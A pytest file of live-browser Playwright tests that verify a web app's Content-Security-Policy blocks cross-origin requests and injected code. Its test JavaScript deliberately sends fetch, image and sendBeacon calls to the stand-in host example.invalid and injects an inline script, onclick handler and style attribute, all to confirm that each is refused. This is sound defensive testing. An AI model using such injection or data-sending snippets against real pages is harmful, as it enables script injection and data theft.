"""The Content-Security-Policy in a real browser (D-INST-8, D-SEC-56 to D-SEC-60).

1. A page cannot reach another origin: fetch, an image and sendBeacon to an outside address are
   refused by the policy before any request is made (Playwright sees no request at all).
2. A page cannot run what an injection would bring: an inline script, an inline handler, a style
   attribute and a string handed to setTimeout are refused.
3. data-k-style (static/js/k-head.js) applies only its allowlisted properties and plain values.

Every other browser test fails on any violation (tests/browser.py, tests/conftest.py); these
tests make violations on purpose, so each one takes the record and asserts on it. Invented text
only; the outside address is example.invalid, which never resolves, and no request reaches it.

Gated like the other live-browser tests: set KESTREL_LIVE_BROWSER=1.
"""

from __future__ import annotations

import os

import pytest

from tests.browser import launch_sync, take_csp_violations, wait_for_app_ready
from tests.browser_plugin import browser_artifacts  # noqa: F401

pytestmark = pytest.mark.skipif(
    os.environ.get("KESTREL_LIVE_BROWSER") != "1",
    reason="launches a real browser; set KESTREL_LIVE_BROWSER=1",
)

OUTSIDE = "https://example.invalid"


@pytest.fixture
def live():
    from playwright.sync_api import sync_playwright

    from kestrel.db import migrate
    from kestrel.web.serve import running_server

    migrate.run_migrations()
    with running_server(worker=False) as base, sync_playwright() as p:
        browser = launch_sync(p)
        yield base, browser
        browser.close()


def _page(live, path="/help"):
    base, browser = live
    ctx = browser.new_context(viewport={"width": 1280, "height": 900})
    # A request the policy refuses may still show as a request event (Chromium reports the
    # refused image that way), but it fails with the reason "csp" (observed in Chromium,
    # 2026-11-14; Edge is the same engine, unverified) and has no response.
    # A response from there, or a failure for any other reason, would mean it was sent.
    outside: list[str] = []
    ctx.on("response",
           lambda r: outside.append(f"answered {r.url}") if "example.invalid" in r.url else None)
    ctx.on("requestfailed", lambda r: outside.append(f"{r.failure} {r.url}")
           if "example.invalid" in r.url and (r.failure or "") != "csp"
           else None)
    page = ctx.new_page()
    page.goto(f"{base}{path}")
    wait_for_app_ready(page)
    return ctx, page, outside


_REACH_OUT = """async (outside) => {
  const seen = [];
  document.addEventListener('securitypolicyviolation',
    (e) => seen.push({directive: e.effectiveDirective, blocked: e.blockedURI}));
  let fetched = 'answered';
  try { await fetch(outside + '/k-fetch'); } catch (err) { fetched = 'refused'; }
  const img = new Image();
  const loaded = new Promise((resolve) => {
    img.addEventListener('load', () => resolve('loaded'));
    img.addEventListener('error', () => resolve('refused'));
  });
  img.src = outside + '/k-image.png';
  document.body.appendChild(img);
  const image = await loaded;
  navigator.sendBeacon(outside + '/k-beacon', 'invented');
  await new Promise((resolve) => setTimeout(resolve, 400));
  return {fetched, image, seen};
}"""


def test_fetch_image_and_beacon_to_another_origin_are_refused(live):
    ctx, page, outside = _page(live)
    try:
        got = page.evaluate(_REACH_OUT, OUTSIDE)
        page.wait_for_timeout(200)
    finally:
        ctx.close()
    watched = take_csp_violations()
    assert got["fetched"] == "refused" and got["image"] == "refused", got
    pairs = {(v["directive"], v["blocked"]) for v in got["seen"]}
    assert ("connect-src", f"{OUTSIDE}/k-fetch") in pairs, got["seen"]
    assert ("img-src", f"{OUTSIDE}/k-image.png") in pairs, got["seen"]
    assert ("connect-src", f"{OUTSIDE}/k-beacon") in pairs, got["seen"]
    assert outside == [], f"a request left for another origin: {outside}"
    # The shared watch saw the same three, so it is what fails every other browser test.
    blocked = {v.get("blocked") for v in watched if v.get("kind") == "violation"}
    assert {f"{OUTSIDE}/k-fetch", f"{OUTSIDE}/k-image.png", f"{OUTSIDE}/k-beacon"} <= blocked, (
        watched)


_INJECT = """async () => {
  const seen = [];
  document.addEventListener('securitypolicyviolation', (e) => seen.push(e.effectiveDirective));
  document.body.insertAdjacentHTML('beforeend',
    '<div id="k-inj" style="color: rgb(255, 0, 0)" onclick="window.__kClicked = 1">Invented</div>');
  const el = document.getElementById('k-inj');
  el.click();
  const s = document.createElement('script');
  s.textContent = 'window.__kInline = 1';
  document.body.appendChild(s);
  try { setTimeout('window.__kTimer = 1', 0); } catch (err) { /* refused at once */ }
  await new Promise((resolve) => setTimeout(resolve, 300));
  return {color: getComputedStyle(el).color, clicked: !!window.__kClicked,
          inline: !!window.__kInline, timer: !!window.__kTimer, seen};
}"""


def test_injected_script_handler_style_and_string_timer_are_refused(live):
    ctx, page, _ = _page(live)
    try:
        got = page.evaluate(_INJECT)
    finally:
        ctx.close()
    take_csp_violations()
    assert got["color"] != "rgb(255, 0, 0)", got
    assert not got["clicked"] and not got["inline"] and not got["timer"], got
    assert {"style-src-attr", "script-src-attr", "script-src-elem", "script-src"} <= set(
        got["seen"]), got["seen"]


_K_STYLE = """async () => {
  document.body.insertAdjacentHTML('beforeend', '<div id="k-ks" data-k-style="width: 40px; ' +
    'color: rgb(255, 0, 0); --k-test: 3; --k-img: url(x); height: 1px; ' +
    'flex: \\'1\\'"></div>');
  await new Promise((resolve) => requestAnimationFrame(resolve));
  const el = document.getElementById('k-ks');
  const cs = getComputedStyle(el);
  const out = {width: cs.width, color: cs.color, custom: el.style.getPropertyValue('--k-test'),
               img: el.style.getPropertyValue('--k-img'), height: el.style.height,
               flex: el.style.flex};
  el.setAttribute('data-k-style', 'width: 20px');
  await new Promise((resolve) => requestAnimationFrame(resolve));
  out.after = {width: getComputedStyle(el).width, height: el.style.height};
  return out;
}"""


def test_data_k_style_applies_only_allowlisted_plain_values(live):
    ctx, page, _ = _page(live)
    try:
        got = page.evaluate(_K_STYLE)
    finally:
        ctx.close()
    assert take_csp_violations() == []
    assert got["width"] == "40px" and got["custom"].strip() == "3" and got["height"] == "1px", got
    assert got["color"] != "rgb(255, 0, 0)", got  # not an allowlisted property
    assert got["img"] == "", got  # url() is never applied, even where CSS would take it
    assert got["flex"] == "", got  # quotes are never applied
    assert got["after"] == {"width": "20px", "height": ""}, got  # a changed value replaces all


_WHEN = """async () => {
  let sent = 0;
  document.body.addEventListener('htmx:beforeRequest', (e) => {
    if ((e.detail.elt || {}).id === 'k-when') sent += 1;
  });
  document.body.insertAdjacentHTML('beforeend',
    '<div id="k-when" hx-get="/status/counts" hx-trigger="every 150ms" hx-swap="none" ' +
    'data-k-when="poll=no-modal"></div>' +
    '<dialog id="k-when-dlg"><p>Invented</p></dialog>' +
    '<div id="k-when-x" hx-get="/status/counts" hx-trigger="every 150ms" hx-swap="none" ' +
    'data-k-when="poll=no-such-check"></div>');
  let unknown = 0;
  document.body.addEventListener('htmx:beforeRequest', (e) => {
    if ((e.detail.elt || {}).id === 'k-when-x') unknown += 1;
  });
  htmx.process(document.getElementById('k-when'));
  htmx.process(document.getElementById('k-when-x'));
  const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
  document.getElementById('k-when-dlg').showModal();
  await wait(800);
  const whileOpen = sent;
  document.getElementById('k-when-dlg').close();
  await wait(800);
  return {whileOpen, afterClose: sent - whileOpen, unknown};
}"""


def test_a_named_check_holds_a_timed_request_and_an_unknown_one_never_sends(live):
    """D-SEC-58: data-k-when replaces htmx's eval'd trigger filter."""
    ctx, page, _ = _page(live)
    try:
        got = page.evaluate(_WHEN)
    finally:
        ctx.close()
    assert take_csp_violations() == []
    assert got["whileOpen"] == 0 and got["afterClose"] >= 2, got
    assert got["unknown"] == 0, got


_DEDUP = """async () => {
  document.body.insertAdjacentHTML('beforeend',
    '<div id="k-dd" hx-get="/k-dedup-invented" hx-trigger="every 150ms" hx-swap="innerHTML">' +
    '<i data-k-style="width: 40%">Invented</i></div>');
  let swaps = 0;
  document.body.addEventListener('htmx:afterSwap',
    (e) => { if (e.target.id === 'k-dd') swaps += 1; });
  htmx.process(document.getElementById('k-dd'));
  await new Promise((resolve) => setTimeout(resolve, 1000));
  return {swaps, width: document.querySelector('#k-dd i').style.width};
}"""


def test_a_poll_that_brings_back_the_same_markup_is_not_swapped(live):
    """The poll de-dup (kestrel-ui.js) compares the answer with the markup as served: the style
    k-head.js applied from data-k-style is not a difference (D-SEC-57)."""
    ctx, page, _ = _page(live)
    try:
        page.route("**/k-dedup-invented", lambda route: route.fulfill(
            status=200, content_type="text/html",
            body='<i data-k-style="width: 40%">Invented</i>'))
        got = page.evaluate(_DEDUP)
    finally:
        ctx.close()
    assert take_csp_violations() == []
    assert got == {"swaps": 0, "width": "40%"}, got


def test_hidden_wins_over_a_display_class_that_replaced_a_style_attribute(live):
    """D-SEC-57: an inline display lost to [hidden]; the u-d-* class that replaced it must too."""
    ctx, page, _ = _page(live)
    try:
        got = page.evaluate("""() => {
          document.body.insertAdjacentHTML('beforeend',
            '<div id="k-hd" class="u-d-flex" hidden>Invented</div>');
          const el = document.getElementById('k-hd');
          const hidden = getComputedStyle(el).display;
          el.hidden = false;
          return [hidden, getComputedStyle(el).display];
        }""")
    finally:
        ctx.close()
    assert got == ["none", "flex"], got


def test_every_data_k_name_a_template_uses_is_one_k_head_defines(live):
    """D-SEC-58: data-k-when, data-k-vals, data-k-after-request and data-k-init replaced code in
    the templates; a name k-head.js does not define would silently never act. The names k-head.js
    defines are read from it at runtime (KStyle.names), the names used from the templates."""
    import re
    from pathlib import Path

    from kestrel import paths

    used: dict[str, set[str]] = {"when": set(), "vals": set(), "after": set(), "init": set()}
    attr = {"data-k-when": "when", "data-k-vals": "vals", "data-k-after-request": "after",
            "data-k-init": "init"}
    for f in Path(paths.web_templates_dir()).rglob("*.html"):
        for name, value in re.findall(r'(data-k-(?:when|vals|after-request|init))="([^"]*)"',
                                      f.read_text(encoding="utf-8")):
            kind = attr[name]
            if kind == "when":
                used[kind] |= {p.split("=", 1)[1].strip() for p in value.split(";") if "=" in p}
            else:
                used[kind].add(value)
    assert all(used.values()), used  # each attribute is in use, so the scan found something
    ctx, page, _ = _page(live)
    try:
        defined = page.evaluate("() => window.KStyle.names()")
    finally:
        ctx.close()
    for kind, names in used.items():
        assert names <= set(defined[kind]), (kind, names - set(defined[kind]))


def test_the_loading_page_draws_its_font_and_mark_under_the_app_policy():
    """D-SEC-61 (round 4): the loading page comes from the shell's own server with the app's
    exact policy; its font, mark, stylesheets and script load and nothing is refused."""
    from playwright.sync_api import sync_playwright

    from kestrel.desktop.splash_server import SplashServer
    from kestrel.web.csp import POLICY

    srv = SplashServer(None).start()
    try:
        with sync_playwright() as p:
            browser = launch_sync(p)
            try:
                ctx = browser.new_context(viewport={"width": 900, "height": 600})
                page = ctx.new_page()
                response = page.goto(srv.url)
                page.wait_for_function("() => !!window.KSplash")
                got = page.evaluate("""async () => {
                  const faces = await document.fonts.load('800 26px Manrope', 'Kestrel');
                  const img = document.querySelector('img.mark');
                  await (img.complete ? Promise.resolve()
                         : new Promise((r) => img.addEventListener('load', r)));
                  await new Promise((resolve) => setTimeout(resolve, 300));
                  return {faces: faces.length, mark: img.naturalWidth > 0,
                          styled: getComputedStyle(document.body).overflow === 'hidden'};
                }""")
                ctx.close()
            finally:
                browser.close()
    finally:
        srv.stop()
    assert take_csp_violations() == []
    assert response.headers["content-security-policy"] == POLICY
    assert got == {"faces": 1, "mark": True, "styled": True}, got
